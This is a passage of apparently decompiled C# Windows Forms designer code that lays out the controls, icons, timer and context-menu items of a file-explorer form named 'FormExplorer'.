		this.removeExclusionToolStripMenuItem.Click += new System.EventHandler(removeExclusionToolStripMenuItem_Click);
		this.rjTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderFocusColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Dock = System.Windows.Forms.DockStyle.Top;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox1.Location = new System.Drawing.Point(0, 0);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "";
		this.rjTextBox1.Size = new System.Drawing.Size(575, 31);
		this.rjTextBox1.TabIndex = 1;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.panel3.Controls.Add(this.materialLabel1);
		this.panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel3.Location = new System.Drawing.Point(0, 550);
		this.panel3.Name = "panel3";
		this.panel3.Size = new System.Drawing.Size(575, 23);
		this.panel3.TabIndex = 0;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(6, 3);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 0;
		this.materialLabel1.Text = "Please wait...";
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.imageList1.Images.SetKeyName(0, "folder.png");
		this.imageList1.Images.SetKeyName(1, "usb-drive.png");
		this.imageList1.Images.SetKeyName(2, "hard-disk.png");
		this.panel4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel4.Location = new System.Drawing.Point(3, 64);
		this.panel4.Name = "panel4";
		this.panel4.Size = new System.Drawing.Size(794, 573);
		this.panel4.TabIndex = 2;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.audioToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("audioToolStripMenuItem.Image");
		this.audioToolStripMenuItem.Name = "audioToolStripMenuItem";
		this.audioToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.audioToolStripMenuItem.Text = "Audio";
		this.audioToolStripMenuItem.Click += new System.EventHandler(audioToolStripMenuItem_Click);
		this.wallpaperToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("wallpaperToolStripMenuItem.Image");
		this.wallpaperToolStripMenuItem.Name = "wallpaperToolStripMenuItem";
		this.wallpaperToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.wallpaperToolStripMenuItem.Text = "Change Wallpaper";
		this.wallpaperToolStripMenuItem.Click += new System.EventHandler(wallpaperToolStripMenuItem_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(800, 640);
		base.Controls.Add(this.panel2);
		base.Controls.Add(this.panel1);
		base.Controls.Add(this.panel4);
		base.Name = "FormExplorer";
		this.Text = "Explorer";
		base.Load += new System.EventHandler(FormExplorer_Load);
		this.panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dataGridView3).EndInit();
		((System.ComponentModel.ISupportInitialize)this.dataGridView1).EndInit();
		this.panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel3.ResumeLayout(false);
		this.panel3.PerformLayout();
		base.ResumeLayout(false);
	}
}
